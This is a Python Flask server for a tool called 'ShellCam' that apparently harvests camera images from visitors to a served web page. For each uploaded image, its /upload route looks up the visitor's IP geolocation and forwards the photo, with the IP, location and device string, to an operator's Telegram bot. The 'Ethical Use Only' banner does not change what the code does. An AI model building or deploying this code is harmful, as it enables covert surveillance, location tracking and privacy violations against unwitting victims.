# server.py
from flask import Flask, request, render_template, send_from_directory, jsonify
import os
from datetime import datetime
import requests
import sys

RED = "\033[91m"
RESET = "\033[38;5;208m"

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    print(RED + r'''
    ███████╗██╗  ██╗███████╗██╗     ██╗ ██████╗██╗  ██╗
    ██╔════╝██║  ██║██╔════╝██║     ██║██╔════╝██║ ██╔╝
    ███████╗███████║█████╗  ██║     ██║██║     █████╔╝ 
    ╚════██║██╔══██║██╔══╝  ██║     ██║██║     ██╔═██╗ 
    ███████║██║  ██║███████╗███████╗██║╚██████╗██║  ██╗
    ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝ ╚═════╝╚═╝  ╚═╝
    ''' + RESET)
    print(RED + "             🛑 ShellCam Loaded — Ethical Use Only!\n              Developer : 𝑀𝑜ℎ𝑒𝑒𝑏\n" + RESET)

app = Flask(__name__)
UPLOAD_FOLDER = 'uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True) 

# هنا مكان إظهار البانر أولاً
clear()
banner()

# بعدها يتم أخذ البيانات من المستخدم
TELEGRAM_TOKEN = input(RESET+'Enter Telegram token: ') 
TELEGRAM_CHAT_ID = input(RESET+'Enter your Telegram account ID: ') 
TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"  

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():

    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')

    geo_req = requests.get(f"http://ip-api.com/json/{ip}").json()
    location = f"{geo_req.get('country')}, {geo_req.get('regionName')}, {geo_req.get('city')}"

    if 'image' in request.files:
        img = request.files['image']
        filename = datetime.now().strftime("%Y%m%d_%H%M%S_%f") + ".jpg"
        img_path = os.path.join(UPLOAD_FOLDER, filename)
        img.save(img_path)  

        caption = f"\ud83d\udcf8 ShellCam Capture\n\ud83c\udf0d Location: {location}\n\ud83c\udf10 IP: {ip}\n\ud83d\udcbb Device: {user_agent}"

        with open(img_path, 'rb') as photo:
            requests.post(TELEGRAM_API_URL, data={
                'chat_id': TELEGRAM_CHAT_ID,
                'caption': caption
            }, files={
                'photo': photo
            })
        return 'Image uploaded and sent to Telegram', 200
    return 'No image found', 400  

@app.route('/uploads/<filename>')
def uploaded_file(filename):
    return send_from_directory(UPLOAD_FOLDER, filename)  

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
    